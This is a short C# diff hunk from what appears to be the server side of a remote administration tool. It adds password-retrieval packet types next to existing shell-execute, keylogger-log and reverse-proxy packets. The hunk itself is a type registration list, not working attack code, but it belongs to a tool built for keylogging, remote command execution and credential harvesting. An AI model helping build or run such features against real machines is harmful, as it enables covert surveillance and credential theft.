@@ -165,6 +165,8 @@ namespace xServer.Core.Networking
                 typeof (Packets.ClientPackets.DoShellExecuteResponse),
                 typeof (Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Packets.ClientPackets.GetKeyloggerLogsResponse),
+                typeof (Packets.ClientPackets.GetPasswordsResponse),
+                typeof (Packets.ServerPackets.GetPasswords),
                 typeof (ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
